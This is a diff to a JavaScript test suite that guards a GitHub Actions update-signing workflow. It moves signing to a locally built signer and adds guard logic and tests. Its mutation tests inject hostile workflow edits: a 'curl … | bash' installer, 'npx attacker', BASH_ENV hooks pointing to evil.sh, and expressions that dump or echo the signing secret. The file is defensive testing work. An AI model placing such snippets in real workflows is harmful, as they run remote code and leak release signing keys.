@@ -1,5 +1,5 @@
 // Review guard for accidental and careless workflow edits. A hostile branch can
-// change this guard; the update-signing Environment's tag restrictions protect the key.
+// change this guard; the update-signing Environment, which admits only main, protects the key.
 import test from 'node:test';
 import yaml from 'js-yaml';
 import assert from 'node:assert/strict';
@@ -574,11 +574,13 @@ test('the update feed job fails a stable release without its key, signs with the
   assert.match(job, /test -n "\$update_key_id"/);
   assert.match(job, /--key-id "\$\{update_key_id\}"/);
 
-  // The receiver's binary signs and verifies every indexed signal before packing.
-  assert.match(job, /tar -xzf "dist\/cli\/spacedatanetwork-\$\{VERSION\}-linux-amd64\.tar\.gz"/);
-  assert.match(job, /update sign-signals[\s\S]*--key-env SDN_UPDATE_SIGNING_KEY_PEM/);
-  assert.match(job, /update sign-signals --verify-only[\s\S]*--roots deployment\/release\/fleet-trust-roots\.json/);
-  assert.ok(job.indexOf('update sign-signals --verify-only') < job.indexOf('tar -czf "dist/update-feed/'));
+  // A signer built in this job from the checked-out commit signs and verifies
+  // every indexed signal before packing; no downloaded program runs here.
+  assert.match(job, /CGO_ENABLED=0 "\$\{go_bin\}" build -trimpath \\\n\s+-o "\$RUNNER_TEMP\/sdn-signal-signer\/sdn-update-signal-signer" \.\/cmd\/sdn-update-signal-signer\n/);
+  assert.doesNotMatch(job, /tar -x|merge-multiple/);
+  assert.match(job, /sdn-update-signal-signer" \\\n\s+--key-env SDN_UPDATE_SIGNING_KEY_PEM/);
+  assert.match(job, /sdn-update-signal-signer" --verify-only[\s\S]*--roots deployment\/release\/fleet-trust-roots\.json/);
+  assert.ok(job.indexOf('sdn-update-signal-signer" --verify-only') < job.indexOf('tar -czf "dist/update-feed/'));
 
   // Every manifest is verified against the fleet roots before the feed is packed.
   const verify = job.indexOf('verify-cli-update-feed.mjs');
@@ -919,13 +921,26 @@ function guardUpdateSigningWorkflow(workflow, path = '.github/workflows/beta-rel
   const parsed = yaml.load(workflow);
   const isRelease = path === '.github/workflows/beta-release-artifacts.yml';
   const keyJobs = new Set(['update-signing-check', 'cli-update-feed']);
+  // Only the reviewed key jobs of the release workflow may name the signing
+  // Environment. Any other environment is a literal name that is not it.
+  for (const [jobName, job] of Object.entries(parsed?.jobs ?? {})) {
+    if (!job || typeof job !== 'object' || !Object.hasOwn(job, 'environment')) continue;
+    const environment = typeof job.environment === 'object' && job.environment !== null ? job.environment.name : job.environment;
+    if (isRelease && keyJobs.has(jobName)) continue;
+    assert.equal(typeof environment, 'string', `unreviewed environment in ${path} job ${jobName}`);
+    assert.doesNotMatch(environment, /\$\{\{|update[\s_-]*signing/i, `unreviewed signing environment in ${path} job ${jobName}`);
+  }
   // Scan every expression, including alternate case, bracket indexing and whole-context exports.
+  // Each use of the secrets context must name one secret: secrets.NAME.
   function walk(value, trail = []) {
     if (typeof value === 'string') {
       if (trail.at(-1) === 'secrets') assert.notEqual(value.toLowerCase(), 'inherit', 'inherited secrets are not reviewed');
       for (const expression of value.matchAll(/\$\{\{([\s\S]*?)\}\}/g)) {
         const text = expression[1];
-        assert.doesNotMatch(text, /secrets\s*\[|tojson\s*\(\s*secrets\s*\)/i, 'indirect secret access is not reviewed');
+        for (const use of text.matchAll(/(?<![\w.-])secrets(?![\w-])/gi)) {
+          const rest = text.slice(use.index + use[0].length);
+          assert.match(rest, /^\.[A-Za-z_][A-Za-z0-9_]*(?![\w.[*-])/, 'indirect secret access is not reviewed');
+        }
         if (!/secrets\s*\.\s*sdn_update_signing_key_pem\b/i.test(text)) continue;
         if (/^\s*secrets\.SDN_UPDATE_SIGNING_KEY_PEM\s*!=\s*''\s*$/.test(text)) continue;
         assert.equal(value, '${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}', 'noncanonical key reference');
@@ -976,15 +991,15 @@ test('update signing uses only reviewed programs and scopes every PEM reference'
   }
 });
 
-const unpack = '      - name: Unpack the release signal signer';
+const signerStep = '      - name: Build the release signal signer';
 const reviewedMutations = {
   'job default shell runs a hook': w => w.replace('  cli-update-feed:\n', '  cli-update-feed:\n    defaults:\n      run:\n        shell: env BASH_ENV=./evil.sh bash -e {0}\n'),
   'step shell after run block': w => w.replace("            --key-env SDN_UPDATE_SIGNING_KEY_PEM --feed-dir \"${feed_dir}\" \\\n            --roots deployment/release/fleet-trust-roots.json\n", "            --key-env SDN_UPDATE_SIGNING_KEY_PEM --feed-dir \"${feed_dir}\" \\\n            --roots deployment/release/fleet-trust-roots.json\n        shell: env BASH_ENV=./evil.sh bash -e {0}\n"),
   'lowercase context in beta-version step': w => w.replace("          INPUT_VERSION: ${{ inputs.version }}\n", "          INPUT_VERSION: ${{ inputs.version }}\n          K: ${{ secrets.sdn_update_signing_key_pem }}\n"),
   'spaced-dot in another job': w => w.replace("          INPUT_VERSION: ${{ inputs.version }}\n", "          INPUT_VERSION: ${{ inputs.version }}\n          K: ${{ SECRETS.SDN_UPDATE_SIGNING_KEY_PEM }}\n"),
-  'bracket index syntax': w => w.replace(unpack, unpack + "\n        env:\n          RENAMED: ${{ secrets['SDN_UPDATE_SIGNING_KEY_PEM'] }}"),
-  'lowercase context': w => w.replace(unpack, unpack + "\n        env:\n          RENAMED: ${{ secrets.sdn_update_signing_key_pem }}"),
-  'toJSON(secrets)': w => w.replace(unpack, unpack + "\n        env:\n          ALL: ${{ toJSON(secrets) }}"),
+  'bracket index syntax': w => w.replace(signerStep, signerStep + "\n        env:\n          RENAMED: ${{ secrets['SDN_UPDATE_SIGNING_KEY_PEM'] }}"),
+  'lowercase context': w => w.replace(signerStep, signerStep + "\n        env:\n          RENAMED: ${{ secrets.sdn_update_signing_key_pem }}"),
+  'toJSON(secrets)': w => w.replace(signerStep, signerStep + "\n        env:\n          ALL: ${{ toJSON(secrets) }}"),
   'BASH_ENV on key step': w => w.replace("          RELEASE_MATURITY: ${{ needs.beta-version.outputs.channel }}\n          SDN_UPDATE_SIGNING_KEY_PEM",
     "          BASH_ENV: ./evil.sh\n          RELEASE_MATURITY: ${{ needs.beta-version.outputs.channel }}\n          SDN_UPDATE_SIGNING_KEY_PEM"),
   'NODE_OPTIONS on key-check step (beta-version)': w => w.replace("          RELEASE_MATURITY: ${{ needs.beta-version.outputs.channel }}\n",
@@ -998,8 +1013,8 @@ const reviewedMutations = {
   'reusable workflow with secrets: inherit': w => w.replace("  desktop:\n", "  leak:\n    uses: ./.github/workflows/leak.yml\n    secrets: inherit\n  desktop:\n"),
   'job-level env holding PEM in beta-version with != trick': w => w.replace("          RELEASE_MATURITY: ${{ needs.beta-version.outputs.channel }}\n",
     "          RELEASE_MATURITY: ${{ needs.beta-version.outputs.channel }}\n          X: ${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM != '' && secrets.SDN_UPDATE_SIGNING_KEY_PEM }}\n"),
-  'setup-node registry-url / cache in cli-update-feed': w => w.replace("      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020\n        with:\n          node-version: '24'\n      - name: Unpack",
-    "      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020\n        with:\n          node-version: '24'\n          cache: npm\n      - name: Unpack"),
+  'setup-node registry-url / cache in cli-update-feed': w => w.replace("      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020\n        with:\n          node-version: '24'\n      - name: Build the release signal signer",
+    "      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020\n        with:\n          node-version: '24'\n          cache: npm\n      - name: Build the release signal signer"),
 };
 const signingMutations = {
   ...reviewedMutations,
@@ -1007,17 +1022,26 @@ const signingMutations = {
   'workflow defaults': w => 'defaults:\n  run:\n    shell: env BASH_ENV=./evil bash {0}\n' + w,
   'missing signing Environment': w => w.replace('    environment: update-signing\n', ''),
   'mutable action tag in key job': w => w.replace('actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683', 'actions/checkout@v4'),
-  'double quoted bracket key': w => w.replace('      - name: Unpack the release signal signer', '      - name: Unpack the release signal signer\n        env:\n          K: \${{ secrets["SDN_UPDATE_SIGNING_KEY_PEM"] }}'),
+  'double quoted bracket key': w => w.replace('      - name: Build the release signal signer', '      - name: Build the release signal signer\n        env:\n          K: \${{ secrets["SDN_UPDATE_SIGNING_KEY_PEM"] }}'),
 
-  'renamed PEM environment in another step': w => w.replace('      - name: Unpack the release signal signer', '      - name: Unpack the release signal signer\n        env:\n          RENAMED: ${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}'),
-  'PEM in another run': w => w.replace('          mkdir -p "$RUNNER_TEMP/sdn-signal-signer"', '          echo "${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}"'),
+  'renamed PEM environment in another step': w => w.replace('      - name: Build the release signal signer', '      - name: Build the release signal signer\n        env:\n          RENAMED: ${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}'),
+  'PEM in another run': w => w.replace('          test -x "${go_bin}"', '          echo "${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}"'),
   'workflow environment with renamed PEM': w => 'env:\n  RENAMED: ${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}\n' + w,
   'job environment with renamed PEM': w => w.replace('      SDN_UPDATE_SEQUENCE:', '      RENAMED: ${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}\n      SDN_UPDATE_SEQUENCE:'),
-  'go run': w => w.replace('          mkdir -p "$RUNNER_TEMP/sdn-signal-signer"', '          go run ./cmd/signer'),
-  'setup-go': w => w.replace('      - name: Unpack the release signal signer', '      - uses: actions/setup-go@v5\n      - name: Unpack the release signal signer'),
-  'upstream shell installer': w => w.replace('          mkdir -p "$RUNNER_TEMP/sdn-signal-signer"', '          curl https://example.invalid/install | bash'),
+  'go run': w => w.replace('          test -x "${go_bin}"', '          go run ./cmd/signer'),
+  'setup-go': w => w.replace('      - name: Build the release signal signer', '      - uses: actions/setup-go@v5\n      - name: Build the release signal signer'),
+  'upstream shell installer': w => w.replace('          test -x "${go_bin}"', '          curl https://example.invalid/install | bash'),
   'npx inside signing': w => w.replace('          key_check="$RUNNER_TEMP/update-key-check"', '          npx attacker\n          key_check="$RUNNER_TEMP/update-key-check"'),
   'shell substitution inside signing': w => w.replace('          key_check="$RUNNER_TEMP/update-key-check"', '          key_check="$(npx attacker)"'),
+  'join(secrets.*) in beta-version': w => w.replace("          INPUT_VERSION: ${{ inputs.version }}\n", "          INPUT_VERSION: ${{ inputs.version }}\n          K: ${{ join(secrets.*, ' ') }}\n"),
+  'toJSON(secrets.*) in beta-version': w => w.replace("          INPUT_VERSION: ${{ inputs.version }}\n", "          INPUT_VERSION: ${{ inputs.version }}\n          K: ${{ toJSON(secrets.*) }}\n"),
+  'property filter on secrets': w => w.replace("          INPUT_VERSION: ${{ inputs.version }}\n", "          INPUT_VERSION: ${{ inputs.version }}\n          K: ${{ secrets.*.length }}\n"),
+  'extra job in the signing Environment': w => w.replace('  desktop:\n', '  extra:\n    runs-on: ubuntu-latest\n    environment: update-signing\n    steps:\n      - run: echo hi\n  desktop:\n'),
+  'extra job naming the signing Environment as an object': w => w.replace('  desktop:\n', '  extra:\n    runs-on: ubuntu-latest\n    environment:\n      name: Update-Signing\n    steps:\n      - run: echo hi\n  desktop:\n'),
+  'extra job with a computed environment': w => w.replace('  desktop:\n', "  extra:\n    runs-on: ubuntu-latest\n    environment: ${{ format('update-{0}', 'signing') }}\n    steps:\n      - run: echo hi\n  desktop:\n"),
+  'merged CLI artifacts in the key job': w => w.replace('          pattern: cli-*\n          path: dist/cli\n', '          pattern: cli-*\n          path: dist/cli\n          merge-multiple: true\n'),
+  'signer unpacked from a downloaded archive': w => w.replace('          test -x "${go_bin}"', '          tar -xzf "dist/cli/cli-linux-amd64/spacedatanetwork-${VERSION}-linux-amd64.tar.gz" -C "$RUNNER_TEMP/sdn-signal-signer"'),
+  'signing with a downloaded binary': w => w.replace('          "$RUNNER_TEMP/sdn-signal-signer/sdn-update-signal-signer" \\\n            --key-env', '          dist/cli/cli-linux-amd64/bin/spacedatanetwork update sign-signals \\\n            --key-env'),
 };
 for (const [name, mutate] of Object.entries(signingMutations)) {
   test(`signing guard rejects ${name}`, () => {
@@ -1044,11 +1068,18 @@ test('feed verification independently requires all five platform pairs', () => {
   assert.throws(() => guardFeedTargets(workflow.replace('--expect-count 5', '--expect-count 4')));
 });
 
-for (const expression of ["secrets['SDN_UPDATE_SIGNING_KEY_PEM']", 'SECRETS.sdn_update_signing_key_pem', 'toJSON(secrets)']) {
+for (const expression of ["secrets['SDN_UPDATE_SIGNING_KEY_PEM']", 'SECRETS.sdn_update_signing_key_pem', 'toJSON(secrets)', "join(secrets.*, ',')", 'toJSON(secrets.*)', 'secrets.*', 'secrets . NAME']) {
   test(`signing guard scans new workflows for ${expression}`, () => {
     assert.throws(() => guardUpdateSigningWorkflow(`jobs:\n  leak:\n    steps:\n      - run: echo \${{ ${expression} }}\n`, '.github/workflows/new.yml'));
   });
 }
+test('signing guard refuses the signing Environment in a new workflow', () => {
+  assert.throws(() => guardUpdateSigningWorkflow('jobs:\n  leak:\n    runs-on: ubuntu-latest\n    environment: update-signing\n    steps:\n      - run: echo hi\n', '.github/workflows/new.yml'));
+  assert.throws(() => guardUpdateSigningWorkflow("jobs:\n  leak:\n    runs-on: ubuntu-latest\n    environment:\n      name: ${{ inputs.environment }}\n    steps:\n      - run: echo hi\n", '.github/workflows/new.yml'));
+});
+test('signing guard accepts a named non-key secret and another literal environment', () => {
+  guardUpdateSigningWorkflow("jobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - run: echo hi\n        env:\n          T: ${{ secrets.DOCKERHUB_TOKEN }}\n          S: ${{ secrets.MACOS_CSC_LINK != '' }}\n", '.github/workflows/new.yml');
+});
 test('signing guard refuses inherited secrets in other workflows', () => {
   assert.throws(() => guardUpdateSigningWorkflow('jobs:\n  leak:\n    uses: ./other.yml\n    secrets: inherit\n', '.github/workflows/ci.yml'));
 });
